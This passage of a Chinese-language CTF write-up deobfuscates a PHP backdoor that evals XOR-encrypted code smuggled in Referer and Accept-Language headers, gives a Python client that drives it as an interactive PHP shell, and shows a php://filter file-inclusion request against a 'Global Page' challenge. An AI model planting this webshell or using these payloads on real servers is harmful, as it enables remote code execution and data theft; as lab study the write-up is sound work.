class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$kh</span>=<span class="string">&quot;d03a&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span>=<span class="string">&quot;1f3c&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span>.=<span class="variable">$t</span> &#123;</span><br><span class="line">                <span class="variable">$i</span></span><br><span class="line">            &#125;</span><br><span class="line">            ^<span class="variable">$k</span> &#123;</span><br><span class="line">                <span class="variable">$j</span></span><br><span class="line">            &#125;</span><br><span class="line">            ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$r</span>=<span class="variable">$_SERVER</span>;</span><br><span class="line"><span class="variable">$rr</span>=@<span class="variable">$r</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line"><span class="variable">$ra</span>=@<span class="variable">$r</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rr</span>&amp;&amp;<span class="variable">$ra</span>) &#123;</span><br><span class="line">    <span class="variable">$u</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$rr</span>);</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$u</span>[<span class="string">&quot;query&quot;</span>],<span class="variable">$q</span>);</span><br><span class="line">    <span class="variable">$q</span>=<span class="title function_ invoke__">array_values</span>(<span class="variable">$q</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,<span class="variable">$ra</span>,<span class="variable">$m</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$q</span>&amp;&amp;<span class="variable">$m</span>) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">        <span class="variable">$s</span>=&amp;<span class="variable">$_SESSION</span>;</span><br><span class="line">        <span class="variable">$ss</span>=<span class="string">&quot;substr&quot;</span>;</span><br><span class="line">        <span class="variable">$sl</span>=<span class="string">&quot;strtolower&quot;</span>;</span><br><span class="line">        <span class="variable">$i</span>=<span class="variable">$m</span>[<span class="number">1</span>][<span class="number">0</span>].<span class="variable">$m</span>[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$h</span>=<span class="variable">$sl</span>(<span class="variable">$ss</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kh</span>),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">        <span class="variable">$f</span>=<span class="variable">$sl</span>(<span class="variable">$ss</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kf</span>),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">        <span class="variable">$p</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$z</span>=<span class="number">1</span>;<span class="variable">$z</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$m</span>[<span class="number">1</span>]);<span class="variable">$z</span>++)<span class="variable">$p</span>.=<span class="variable">$q</span>[<span class="variable">$m</span>[<span class="number">2</span>][<span class="variable">$z</span>]];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$p</span>,<span class="variable">$h</span>)===<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="variable">$p</span>=<span class="variable">$ss</span>(<span class="variable">$p</span>,<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$i</span>,<span class="variable">$s</span>)) &#123;</span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>].=<span class="variable">$p</span>;</span><br><span class="line">            <span class="variable">$e</span>=<span class="title function_ invoke__">strpos</span>(<span class="variable">$s</span>[<span class="variable">$i</span>],<span class="variable">$f</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="variable">$k</span>=<span class="variable">$kh</span>.<span class="variable">$kf</span>;</span><br><span class="line">                <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">                @<span class="keyword">eval</span>(@<span class="title function_ invoke__">gzuncompress</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),<span class="variable">$ss</span>(<span class="variable">$s</span>[<span class="variable">$i</span>],<span class="number">0</span>,<span class="variable">$e</span>))),<span class="variable">$k</span>)));</span><br><span class="line">                <span class="variable">$o</span>=<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">                <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">                <span class="variable">$d</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">x</span>(<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$o</span>),<span class="variable">$k</span>));</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br><span class="line">                @<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再进一步反混淆</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$kh</span>=<span class="string">&quot;d03a&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span>=<span class="string">&quot;1f3c&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_xor</span>(<span class="params"><span class="variable">$content</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>);)</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>)&amp;&amp;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++)</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$content</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$key</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$_SERVER</span>;</span><br><span class="line"><span class="variable">$referer</span> = @<span class="variable">$r</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line"><span class="variable">$accept_language</span> = @<span class="variable">$r</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$referer</span> &amp;&amp; <span class="variable">$accept_language</span>) &#123;</span><br><span class="line">    <span class="comment">// 解析 http referer 的 query</span></span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$referer</span>)[<span class="string">&quot;query&quot;</span>], <span class="variable">$query</span>);</span><br><span class="line">    <span class="variable">$query</span> = <span class="title function_ invoke__">array_values</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在 accept language 里找到 paylaod 参数</span></span><br><span class="line">    <span class="comment">// 例如 fr-CH, fr;q=0.0, en;q=0.1, de;q=0.2, *;q=0.5</span></span><br><span class="line">    <span class="comment">// 结果为</span></span><br><span class="line">    <span class="comment">// matched[0] = &#123;0 =&gt; &#x27;fr-CH,&#x27;, 1 =&gt; &#x27;fr;q=0.0,&#x27;, 2 =&gt; &#x27;en;q=0.1,&#x27;, 3 =&gt; &#x27;de;q=0.2,&#x27;&#125;</span></span><br><span class="line">    <span class="comment">// matched[1] = &#123;0 =&gt; &#x27;f&#x27;,      1 =&gt; &#x27;f&#x27;,         2 =&gt; &#x27;e&#x27;,         3 =&gt; &#x27;d&#x27;&#125;</span></span><br><span class="line">    <span class="comment">// matched[2] = &#123;0 =&gt; &#x27;&#x27;,       1 =&gt; &#x27;0&#x27;,         2 =&gt; &#x27;1&#x27;,         3 =&gt; &#x27;2&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>, <span class="variable">$accept_language</span>, <span class="variable">$matched</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$query</span> &amp;&amp; <span class="variable">$matched</span>) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">        <span class="comment">// 取前两个权重开头字母作为用户标识，例如从 fr-CH, fr;q=0.0, en;q=0.1, de;q=0.2, *;q=0.5 里取出 &#x27;ff&#x27;</span></span><br><span class="line">        <span class="variable">$user</span> = <span class="variable">$matched</span>[<span class="number">1</span>][<span class="number">0</span>].<span class="variable">$matched</span>[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="comment">// 计算 payload 起始和结束标识符</span></span><br><span class="line">        <span class="variable">$head</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$user</span>.<span class="variable">$kh</span>), <span class="number">0</span>, <span class="number">3</span>));  <span class="comment">// md5(&quot;ff&quot; + kh)[:3]</span></span><br><span class="line">        <span class="variable">$tail</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$user</span>.<span class="variable">$kf</span>), <span class="number">0</span>, <span class="number">3</span>));  <span class="comment">// md5(&quot;ff&quot; + kf)[:3]</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$payload</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$matched</span>[<span class="number">1</span>]); <span class="variable">$i</span>++)</span><br><span class="line">            <span class="comment">// 取出所有的权重数字作为在 query 里的 payload 参数</span></span><br><span class="line">            <span class="comment">// 例如从 fr-CH, fr;q=0.0, en;q=0.1, de;q=0.2, *;q=0.5 取出 &quot;0&quot;, &quot;1&quot; 和 &quot;2&quot;，并且在 query 里寻找第 0，第 1 和第 2 个参数</span></span><br><span class="line">            <span class="variable">$payload</span> .= <span class="variable">$query</span>[<span class="variable">$matched</span>[<span class="number">2</span>][<span class="variable">$i</span>]];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果 payload 以 head 开头</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$payload</span>, <span class="variable">$head</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$user</span>] = <span class="string">&quot;&quot;</span>;  <span class="comment">// 清空 session[&quot;ff&quot;]</span></span><br><span class="line">            <span class="variable">$payload</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$payload</span>, <span class="number">3</span>);  <span class="comment">// 从 payload 的开头中剪掉 head</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果 user 有 session，即 payload 以 head 开头</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$user</span>, <span class="variable">$_SESSION</span>)) &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$user</span>] .= <span class="variable">$payload</span>;  <span class="comment">// 获取 payload</span></span><br><span class="line">            <span class="comment">// 根据 tail 标识符找到 payload 结尾</span></span><br><span class="line">            <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$_SESSION</span>[<span class="variable">$user</span>], <span class="variable">$tail</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$pos</span>) &#123;</span><br><span class="line">                <span class="comment">// 异或用的 key</span></span><br><span class="line">                <span class="variable">$key</span> = <span class="variable">$kh</span>.<span class="variable">$kf</span>;</span><br><span class="line"></span><br><span class="line">                <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">                <span class="variable">$payload</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_SESSION</span>[<span class="variable">$user</span>], <span class="number">0</span>, <span class="variable">$pos</span>);  <span class="comment">// 截取 payload，从这里开始的 paylaod 就是去除了 head 和 tail 的</span></span><br><span class="line">                <span class="variable">$payload</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>), <span class="variable">$payload</span>);  <span class="comment">// 将_和 - 替换为 / 和 +</span></span><br><span class="line">                <span class="variable">$payload</span> = @<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$payload</span>);  <span class="comment">// base64 解码</span></span><br><span class="line">                <span class="variable">$payload</span> = @<span class="title function_ invoke__">_xor</span>(<span class="variable">$payload</span>, <span class="variable">$key</span>);  <span class="comment">// 异或解密</span></span><br><span class="line">                <span class="variable">$payload</span> = @<span class="title function_ invoke__">gzuncompress</span>(<span class="variable">$payload</span>);  <span class="comment">// 解压缩</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$payload</span>);  <span class="comment">// 执行代码</span></span><br><span class="line">                <span class="variable">$output</span> = <span class="title function_ invoke__">ob_get_contents</span>(); <span class="comment">// 获取执行结果</span></span><br><span class="line">                <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">                <span class="comment">// 将执行结果压缩，异或加密，base64 编码后输出到网页中</span></span><br><span class="line">                <span class="variable">$output</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">_xor</span>(<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$output</span>),<span class="variable">$key</span>));</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$key</span>&gt;<span class="subst">$output</span>&lt;/<span class="subst">$key</span>&gt;&quot;</span>);</span><br><span class="line">                @<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总的来说原理就是先用 accept language 里提取出每个权重的首字母和权重数字，将前两个权重首字母作为用户的标识，将所有的权重数字作为 payload 数组的下标，payload 分开以数组的方式存放在 referer 的查询里，并且 payload 要以用户标识加 kh 的 MD5 前三位开头，以用户表示加 kf 的 MD5 的前三位结尾。</p><p>编写利用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://vps1.blue-whale.me:23332/backdoor.php&#x27;</span></span><br><span class="line">kh = <span class="string">&#x27;d03a&#x27;</span></span><br><span class="line">kf = <span class="string">&#x27;1f3c&#x27;</span></span><br><span class="line">key = kh + kf</span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">content, key</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(content):</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> j &lt; <span class="built_in">len</span>(key) <span class="keyword">and</span> i &lt; <span class="built_in">len</span>(content):</span><br><span class="line">            result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(content[i]) ^ <span class="built_in">ord</span>(key[j]))</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hack</span>(<span class="params">code</span>):</span><br><span class="line">    head = hashlib.md5(<span class="string">&#x27;ff&#x27;</span> + kh).hexdigest()[:<span class="number">3</span>]</span><br><span class="line">    tail = hashlib.md5(<span class="string">&#x27;ff&#x27;</span> + kf).hexdigest()[:<span class="number">3</span>]</span><br><span class="line">    payload = zlib.compress(code)</span><br><span class="line">    payload = xor(payload, key)</span><br><span class="line">    payload = base64.b64encode(payload)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>).replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://evil.com/?a=%s&amp;b=%s&amp;c=%s&#x27;</span> % (head, payload, tail),</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;fr-CH, fr;q=0.0, en;q=0.1, de;q=0.2, *;q=0.5&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = sess.get(url, headers=headers).content</span><br><span class="line">    result = re.findall(<span class="string">&#x27;&lt;%s&gt;(.*?)&lt;/%s&gt;&#x27;</span> % (key, key), result)[<span class="number">0</span>]</span><br><span class="line">    result = base64.b64decode(result)</span><br><span class="line">    result = xor(result, key)</span><br><span class="line">    result = zlib.decompress(result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span> hack(raw_input(<span class="string">&#x27;php&gt; &#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后得到 flag 为：<code>flag&#123;Y0U_r_brave_t0_so1ve_probl3M&#125;</code></p><h1 id="Global-Page-175"><a href="#Global-Page-175" class="headerlink" title="Global Page(175)"></a>Global Page(175)</h1><p>随便点一个 page，在 Warning 里面显示了</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Warning: include(pwn/zh-CN.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 39</span><br><span class="line"></span><br><span class="line">Warning: include(): Failed opening &#x27;pwn/zh-CN.php&#x27; for inclusion (include_path=&#x27;.:/usr/local/lib/php&#x27;) in /var/www/html/index.php on line 39</span><br></pre></td></tr></table></figure><p>所以是一个文件包含，根据输入的 page 包含一个 page/zh-CN.php 的文件，用 php 伪协议读掩码，%00 截断后面的 /zh-CN.php</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php%00</span><br></pre></td></tr></table></figure><p>但是发现过滤了“/”和“.”，并且无法使用 %00 截断，所以不能通过 page 进行文件包含，但是可以发现 page 后面的 /zh-CH.php 刚好是 accept-language 里面的语言，因此就可以通过修改 accept-language 进行文件包含，发送请求包如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /?page=php: HTTP/1.1</span><br><span class="line">Host: vps1.blue-whale.me:23334</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,/filter/read=convert.base64-encode/resource=index;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将因为存在 page 参数才会开始包含，但是 page 里不能含有“/”，因此可以将 page 设置为“php:”，在 Accept-Language 里设置为“/filter/read=convert.base64-encode/resource=index;q=0.8”即可包含到 index 源码，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;title&gt;Global Page&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">.rtl &#123;</span><br><span class="line">  direction: rtl;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="title function_ invoke__">str_replace</span>([<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href=<span class="string">&quot;./?page=pwn&quot;</span>&gt;Pwn&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;del&gt;Tokyo Westerns&lt;/del&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;a href=<span class="string">&quot;./?page=ctf&quot;</span>&gt;CTF&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;,&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>]) <span class="keyword">as</span> <span class="variable">$lang</span>) &#123;</span><br><span class="line">        <span 